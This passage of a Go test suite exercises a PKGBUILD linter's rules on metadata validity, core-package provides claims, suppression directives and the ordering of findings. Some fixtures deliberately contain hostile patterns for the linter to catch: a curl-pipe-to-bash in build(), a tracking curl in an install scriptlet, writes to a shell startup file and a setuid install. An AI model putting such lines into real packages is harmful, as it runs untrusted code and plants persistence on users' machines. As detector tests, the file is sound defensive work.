		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `provides=('pacman')`)})
	})
	t.Run("PB603 versioned provides claiming glibc", func(t *testing.T) {
		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `provides=('glibc=2.39')`)})
	})
	t.Run("PB603 replaces claiming systemd", func(t *testing.T) {
		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `replaces=('systemd')`)})
	})
	t.Run("PB603 conflicts claiming sudo", func(t *testing.T) {
		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `conflicts=('sudo')`)})
	})
	t.Run("PB603 arch-specific provides claiming pacman", func(t *testing.T) {
		expectRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `provides_x86_64=('pacman')`)})
	})
	t.Run("PB603 variant package providing its parent is fine", func(t *testing.T) {
		expectNoRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith(`pkgname=pacman-git
pkgver=1
pkgrel=1
url='https://example.com'
source=()`, `provides=("pacman=$pkgver")
conflicts=('pacman')`)})
	})
	t.Run("PB603 ordinary provides is fine", func(t *testing.T) {
		expectNoRule(t, "PB603", map[string]string{"PKGBUILD": pkgbuildWith("", `provides=('libfoo.so')`)})
	})
}

func TestCorrectnessRules(t *testing.T) {
	// A minimal valid metadata header these tests vary one field at a time.
	valid := `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')`

	t.Run("PB701 invalid pkgname characters", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=Foo:Bar\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 leading hyphen", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=-demo\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 valid name is fine", func(t *testing.T) {
		expectNoRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=foo-bar_2.0+git\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 array pkgname (split package) validated per element", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=('good' 'Bad:Name')\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	// Bash brace-expands array assignments before makepkg ever sees them, so
	// the braces are not part of any package's name. Both of these declare a
	// perfectly ordinary split package.
	t.Run("PB701 brace-expanded pkgname is fine", func(t *testing.T) {
		expectNoRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=({,python-}open3d)\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB701 brace-expanded pkgname with a suffix is fine", func(t *testing.T) {
		expectNoRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=(openscq30-{cli,gui})\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	// Expansion must not launder a genuinely bad name: every expanded element
	// is still validated on its own.
	t.Run("PB701 brace expansion still catches a bad element", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname=(demo-{cli,Bad:Gui})\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	// A scalar assignment is not brace-expanded by bash, so the braces really
	// are literal characters in the name.
	t.Run("PB701 braces in a scalar pkgname are literal", func(t *testing.T) {
		expectRule(t, "PB701", map[string]string{"PKGBUILD": "pkgname={,python-}open3d\npkgver=1\npkgrel=1\narch=('any')\n"})
	})

	t.Run("PB702 pkgver with hyphen", func(t *testing.T) {
		expectRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1.2.3-beta\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB702 pkgver with colon", func(t *testing.T) {
		expectRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1:2.3\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB702 valid pkgver is fine", func(t *testing.T) {
		expectNoRule(t, "PB702", map[string]string{"PKGBUILD": valid + "\n"})
	})
	t.Run("PB702 flagged even with a pkgver() function (makepkg lints the literal first)", func(t *testing.T) {
		expectRule(t, "PB702", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1.2.3-beta\npkgrel=1\narch=('any')\npkgver() {\n  echo 1\n}\n"})
	})

	t.Run("PB703 non-numeric pkgrel", func(t *testing.T) {
		expectRule(t, "PB703", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1a\narch=('any')\n"})
	})
	t.Run("PB703 decimal pkgrel is fine", func(t *testing.T) {
		expectNoRule(t, "PB703", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1.5\narch=('any')\n"})
	})

	t.Run("PB704 non-integer epoch", func(t *testing.T) {
		expectRule(t, "PB704", map[string]string{"PKGBUILD": valid + "\nepoch=1.0\n"})
	})
	t.Run("PB704 integer epoch is fine", func(t *testing.T) {
		expectNoRule(t, "PB704", map[string]string{"PKGBUILD": valid + "\nepoch=2\n"})
	})

	t.Run("PB705 backup leading slash", func(t *testing.T) {
		expectRule(t, "PB705", map[string]string{"PKGBUILD": valid + "\nbackup=('/etc/foo.conf')\n"})
	})
	t.Run("PB705 relative backup is fine", func(t *testing.T) {
		expectNoRule(t, "PB705", map[string]string{"PKGBUILD": valid + "\nbackup=('etc/foo.conf')\n"})
	})

	t.Run("PB706 unknown option", func(t *testing.T) {
		expectRule(t, "PB706", map[string]string{"PKGBUILD": valid + "\noptions=('!striped')\n"})
	})
	t.Run("PB706 backslash-escaped negation is fine", func(t *testing.T) {
		// Outside an interactive shell there is no history expansion to escape,
		// so bash hands makepkg a plain "!strip".
		expectNoRule(t, "PB706", map[string]string{"PKGBUILD": valid + "\noptions=(\\!strip \\!debug)\n"})
	})
	t.Run("PB706 known options are fine", func(t *testing.T) {
		expectNoRule(t, "PB706", map[string]string{"PKGBUILD": valid + "\noptions=('!strip' 'lto' '!debug')\n"})
	})

	t.Run("PB707 provides comparison operator", func(t *testing.T) {
		expectRule(t, "PB707", map[string]string{"PKGBUILD": valid + "\nprovides=('libfoo<2')\n"})
	})
	t.Run("PB707 exact version provide is fine", func(t *testing.T) {
		expectNoRule(t, "PB707", map[string]string{"PKGBUILD": valid + "\nprovides=('libfoo=1.9')\n"})
	})

	t.Run("PB708 scalar list field", func(t *testing.T) {
		expectRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends=gtk3\n"})
	})
	t.Run("PB708 array scalar field", func(t *testing.T) {
		expectRule(t, "PB708", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\npkgdesc=('a demo')\n"})
	})
	t.Run("PB708 correct types are fine", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends=('gtk3')\n"})
	})
	t.Run("PB708 scalar pkgname is allowed (not a schema array)", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\n"})
	})
	t.Run("PB708 arch-specific scalar list field", func(t *testing.T) {
		expectRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends_x86_64=gtk3\n"})
	})
	t.Run("PB708 indexed element write is an array write, not a scalar", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": valid + `
source=("https://example.com/a.tar.gz" "https://example.com/b.tar.gz")
sha256sums=('deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef'
            'deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef')
sha256sums[1]='SKIP'
`})
	})
	t.Run("PB708 arch-specific array is fine", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends_x86_64=('gtk3')\n"})
	})
	t.Run("PB708 suffix for an undeclared arch is ignored", func(t *testing.T) {
		expectNoRule(t, "PB708", map[string]string{"PKGBUILD": valid + "\ndepends_aarch64=gtk3\n"})
	})

	t.Run("PB709 non-override var in package function", func(t *testing.T) {
		expectRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  makedepends=('go')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 override var in package function is fine", func(t *testing.T) {
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  depends=('glibc')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 local var in package function is fine", func(t *testing.T) {
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  somevar=1\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 local declaration of a schema var is fine", func(t *testing.T) {
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  local pkgver=tmp\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 arch-specific non-override var in package function", func(t *testing.T) {
		expectRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  makedepends_x86_64=('go')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 local-declared schema var is not a global override", func(t *testing.T) {
		// makepkg's regex only matches bare assignments, not `local`/`declare`.
		expectNoRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  local makedepends=('go')\n  make DESTDIR=\"$pkgdir\" install\n}\n"})
	})
	t.Run("PB709 nested schema var is still flagged", func(t *testing.T) {
		expectRule(t, "PB709", map[string]string{"PKGBUILD": valid + "\npackage() {\n  if true; then\n    source=('x')\n  fi\n}\n"})
	})

	t.Run("PB710 missing arch", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\n"})
	})
	t.Run("PB710 any combined with concrete arch", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('any' 'x86_64')\n"})
	})
	t.Run("PB710 duplicate arch", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86_64' 'x86_64')\n"})
	})
	t.Run("PB710 invalid arch characters", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86-64')\n"})
	})
	t.Run("PB710 valid arch is fine", func(t *testing.T) {
		expectNoRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86_64' 'aarch64')\n"})
	})
	// `arch=()` followed by appends is how a PKGBUILD builds the list up one
	// architecture at a time. bash appends; only the literal is empty.
	t.Run("PB710 an array filled by appends is not empty", func(t *testing.T) {
		expectNoRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=()\narch+=('x86_64')\narch+=('aarch64')\n",
		})
	})
	t.Run("PB710 an array left empty is still flagged", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=()\n"})
	})
	// Appended values are validated like any other, even though the merge kept
	// no source text for them.
	t.Run("PB710 an appended value is still validated", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=('x86_64')\narch+=('x86-64')\n",
		})
	})
	// makepkg sources the whole file before reading metadata, so a branch that
	// sets arch has set it; which branch runs is not statically knowable.
	t.Run("PB710 arch set in a top-level conditional is set", func(t *testing.T) {
		expectNoRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\n" +
				"if [[ $CARCH == x86_64 ]]; then\n  arch=('x86_64')\nelse\n  arch=('any')\nfi\n",
		})
	})
	t.Run("PB710 an emptied array a conditional refills is not empty", func(t *testing.T) {
		expectNoRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\narch=()\n" +
				"if [[ -n $SOMETHING ]]; then\n  arch+=('x86_64')\nfi\n",
		})
	})
	// A function body runs long after makepkg has read the metadata, so an
	// assignment there does not count as setting the field.
	t.Run("PB710 arch set only in a build function is not set", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\nbuild() {\n  arch=('x86_64')\n}\n",
		})
	})
	// A subshell's assignment dies with the subshell; makepkg's own shell
	// never sees it, so it does not count as setting the field.
	t.Run("PB710 arch set only in a subshell is not set", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\n( arch=('x86_64') )\n",
		})
	})
	// `arch=x86_64 true` scopes the assignment to that one command.
	t.Run("PB710 arch as a command's env prefix is not set", func(t *testing.T) {
		expectRule(t, "PB710", map[string]string{
			"PKGBUILD": "pkgname=demo\npkgver=1\npkgrel=1\nif [[ -n $X ]]; then\n  arch=x86_64 true\nfi\n",
		})
	})
}

func TestSuppression(t *testing.T) {
	files := map[string]string{"PKGBUILD": pkgbuildWith("", `
build() {
  # pkglint: ignore=PB204
  go build -o demo .
}`)}
	expectNoRule(t, "PB204", files)
}

// findingLine returns the line of the first finding for id, failing the test if
// the fixture no longer trips the rule.
func findingLine(t *testing.T, id string, files map[string]string) int {
	t.Helper()
	fs := lint(t, files)
	for _, f := range fs {
		if f.RuleID == id {
			return f.Line
		}
	}
	t.Fatalf("fixture no longer trips %s: %v", id, ruleIDs(fs))
	return 0
}

// directiveOnLine returns src with "# pkglint: ignore=<id>" inserted so it
// occupies 1-based line n, padding with blank lines when src is shorter.
func directiveOnLine(src, id string, n int) string {
	lines := strings.Split(src, "\n")
	for len(lines) < n-1 {
		lines = append(lines, "")
	}
	out := append([]string{}, lines[:n-1]...)
	out = append(out, "# pkglint: ignore="+id)
	return strings.Join(append(out, lines[n-1:]...), "\n")
}

// TestSuppressionIsPerFile pins that an inline directive only waives findings
// in the file it appears in. Line numbers collide constantly between a PKGBUILD
// and its scriptlets, so a directive matched across files would hide findings
// its author never waived — and would let a benign-looking comment in one file
// silence a finding in another.
func TestSuppressionIsPerFile(t *testing.T) {
	const cleanScriptlet = "post_install() {\n  echo hi\n}\n"
	const netScriptlet = "post_install() {\n  curl -s https://example.com/track\n}\n"
	base := pkgbuildWith("", "install=demo.install")

	t.Run("scriptlet directive does not suppress a PKGBUILD finding", func(t *testing.T) {
		files := map[string]string{
			"PKGBUILD": pkgbuildWith("", "install=demo.install\nbuild() {\n  go build -o demo .\n}"),
			// demo.install must parse, so keep a real body under the directive.
			"demo.install": cleanScriptlet,
		}
		n := findingLine(t, "PB204", files)
		files["demo.install"] = strings.Repeat("\n", n-1) + "# pkglint: ignore=PB204\n" + cleanScriptlet
		expectRule(t, "PB204", files)
	})

	t.Run("PKGBUILD directive suppresses its own finding", func(t *testing.T) {
		expectNoRule(t, "PB204", map[string]string{
			"PKGBUILD": pkgbuildWith("", "build() {\n  go build -o demo . # pkglint: ignore=PB204\n}"),
		})
	})

	t.Run("scriptlet directive suppresses its own finding", func(t *testing.T) {
		expectNoRule(t, "PB501", map[string]string{
			"PKGBUILD":     base,
			"demo.install": "post_install() {\n  # pkglint: ignore=PB501\n  curl -s https://example.com/track\n}\n",
		})
	})

	t.Run("PKGBUILD directive does not suppress a scriptlet finding", func(t *testing.T) {
		files := map[string]string{"PKGBUILD": base, "demo.install": netScriptlet}
		n := findingLine(t, "PB501", files)
		files["PKGBUILD"] = directiveOnLine(base, "PB501", n)
		expectRule(t, "PB501", files)
	})

	t.Run("scriptlet directive suppresses its own PB503", func(t *testing.T) {
		// An `if` with no then/fi: the scriptlet cannot be parsed, so its
		// directives must still be collected for PB503 (reported at line 1).
		const broken = "post_install() {\n  if [ -z ]\n}\n"
		expectRule(t, "PB503", map[string]string{"PKGBUILD": base, "demo.install": broken})
		expectNoRule(t, "PB503", map[string]string{
			"PKGBUILD":     base,
			"demo.install": "# pkglint: ignore=PB503\n" + broken,
		})
	})
}

func TestIgnoreFlag(t *testing.T) {
	dir := t.TempDir()
	content := pkgbuildWith("", `
build() {
  go build -o demo .
}`)
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	pkg, err := pkgbuild.Load(dir)
	if err != nil {
		t.Fatal(err)
	}
	if ids := ruleIDs(Run(pkg, map[string]bool{"PB204": true})); ids["PB204"] != 0 {
		t.Errorf("ignored rule still reported: %v", ids)
	}
}

// tiedFindingsPKGBUILD packs several findings onto the same position: line 7
// col 1 alone carries two PB101s (one per unchecksummed source) plus PB103,
// PB104 and PB105. Those tie on (Path, Line, RuleID) or (Path, Line), so they
// are exactly what an incomplete comparator leaves to the unstable sort.
const tiedFindingsPKGBUILD = `pkgname=demo
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
url='http://example.com/demo'
license=('MIT')
source=("https://example.com/a-$pkgver.tar.gz" "git+https://github.com/example/demo.git" "http://example.com/b.tar.gz")
sha256sums=('SKIP' 'SKIP' 'SKIP')

build() {
  curl -s https://example.com/x | bash
}

package() {
  install -Dm4755 demo "$pkgdir/usr/bin/demo"
}
`

// TestFindingsAreDeterministic is the flakiness proof for Run's ordering.
// Several upstream steps range over maps (NewContext over pkg.Vars, Sources()
// over its own map), so findings reach the sort in a random order; only a total
// comparator makes the output reproducible. Loading inside the loop keeps that
// randomness in play while holding Path fixed.
func TestFindingsAreDeterministic(t *testing.T) {
	dir := t.TempDir()
	files := map[string]string{
		"PKGBUILD": tiedFindingsPKGBUILD,
		"demo.install": `post_install() {
  cp /tmp/x /etc/zsh/.zshrc
  echo hi >> /etc/zsh/.zshrc
}`,
	}
	for name, content := range files {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(content), 0o644); err != nil {
			t.Fatal(err)
		}
	}

	var first []Finding
	for i := 0; i < 50; i++ {
		pkg, err := pkgbuild.Load(dir)
		if err != nil {
			t.Fatalf("load: %v", err)
		}
		got := Run(pkg, nil)
		if i == 0 {
			first = got
			if len(first) < 5 {
				t.Fatalf("fixture should tie several findings, got %d: %+v", len(first), first)
			}
			continue
		}
		if !reflect.DeepEqual(got, first) {
			t.Fatalf("run %d differs from run 0\n--- got ---\n%+v\n--- want ---\n%+v", i, got, first)
		}
	}

	// Reproducibility across runs only proves the input order happened not to
	// vary; assert the ordering itself is total, so no pair is left for an
	// unstable sort to decide.
	for i := 1; i < len(first); i++ {
		if !less(first[i-1], first[i]) {
			t.Errorf("findings %d and %d are not in strict (Path, Line, Col, RuleID, Message) order:\n%+v\n%+v",
				i-1, i, first[i-1], first[i])
		}
	}
}

// less reports whether a sorts strictly before b under the total order Run
// promises. Independent of Run's own comparator on purpose.
func less(a, b Finding) bool {
	if a.Path != b.Path {
		return a.Path < b.Path
	}
	if a.Line != b.Line {
		return a.Line < b.Line
	}
	if a.Col != b.Col {
		return a.Col < b.Col
	}
	if a.RuleID != b.RuleID {
		return a.RuleID < b.RuleID
	}
	return a.Message < b.Message
}

// TestDuplicateFindingsAreDropped covers overlapping persistencePathHints:
// "/etc/zsh/.zshrc" matches both "/etc/zsh" and ".zshrc", which used to report
// the identical PB502 twice per construct.
func TestDuplicateFindingsAreDropped(t *testing.T) {
	base := pkgbuildWith("", "install=demo.install")
	t.Run("command argument", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  cp /tmp/x /etc/zsh/.zshrc
}`,
		}))
		if ids["PB502"] != 1 {
			t.Errorf("expected exactly one PB502, got %d: %v", ids["PB502"], ids)
		}
	})
	t.Run("redirect target", func(t *testing.T) {
		ids := ruleIDs(lint(t, map[string]string{
			"PKGBUILD": base,
			"demo.install": `post_install() {
  echo hi >> /etc/zsh/.zshrc
}`,
		}))
		if ids["PB502"] != 1 {
			t.Errorf("expected exactly one PB502, got %d: %v", ids["PB502"], ids)
		}
	})
}

// TestDistinctFindingsAtOneLocationSurvive guards the dedup key from being too
// loose: findings that share a position but differ in rule ID or message are
// distinct reports and must all survive.
func TestDistinctFindingsAtOneLocationSurvive(t *testing.T) {
	findings := lint(t, map[string]string{"PKGBUILD": tiedFindingsPKGBUILD})
	ids := ruleIDs(findings)

	// Same rule, same position, different message: one PB101 per unchecksummed
	// source on the shared source= line.
	if ids["PB101"] != 2 {
		t.Errorf("expected 2 PB101 (one per skipped source), got %d: %v", ids["PB101"], ids)
	}
	// Different rules at the same position must all be kept.
	for _, id := range []string{"PB103", "PB104", "PB105"} {
		if ids[id] != 1 {
			t.Errorf("expected 1 %s, got %d: %v", id, ids[id], ids)
		}
	}

	// Nothing at all should be lost to dedup: every finding is unique on the
	// full key.
	type key struct {
		rule, msg, path string
		line, col       int
	}
	seen := map[key]bool{}
	for _, f := range findings {
		k := key{f.RuleID, f.Message, f.Path, f.Line, f.Col}
		if seen[k] {
			t.Errorf("duplicate finding survived dedup: %+v", f)
		}
		seen[k] = true
	}
}

// TestSplitPackageVarRendering pins how $pkgname resolves in a split package:
// bash expands the bare array reference to its first element everywhere,
// except inside package_<name>() where makepkg rebinds pkgname to that split.
func TestSplitPackageVarRendering(t *testing.T) {
	dir := t.TempDir()
	content := `pkgbase=demo
pkgname=(demo demo-docs)
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

build() {
  touch $pkgname.built
}

package_demo() {
  install -Dm644 ${pkgname}.service "$pkgdir/usr/lib/systemd/system/${pkgname}.service"
}

package_demo-docs() {
  install -Dm644 COPYING -t "$pkgdir/usr/share/licenses/${pkgname}/"
}
`
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	pkg, err := pkgbuild.Load(dir)
	if err != nil {
		t.Fatalf("load: %v", err)
	}
	ctx := NewContext(pkg)

	argsIn := func(fn string) []string {
		t.Helper()
		for _, c := range ctx.Commands() {
			if c.Fn == fn {
				return c.Args
			}
		}
		t.Fatalf("no command found in %s()", fn)
		return nil
	}

	if args := argsIn("build"); len(args) != 1 || args[0] != "demo.built" {
		t.Errorf("build(): $pkgname should render as the array's first element, got %v", args)
	}
	if args := argsIn("package_demo"); len(args) < 3 || args[1] != "demo.service" {
		t.Errorf("package_demo(): ${pkgname}.service should render as demo.service, got %v", args)
	}
	if args := argsIn("package_demo-docs"); len(args) < 4 || args[3] != "$pkgdir/usr/share/licenses/demo-docs/" {
		t.Errorf("package_demo-docs(): pkgname should rebind to the split's own name, got %v", args)
	}
}
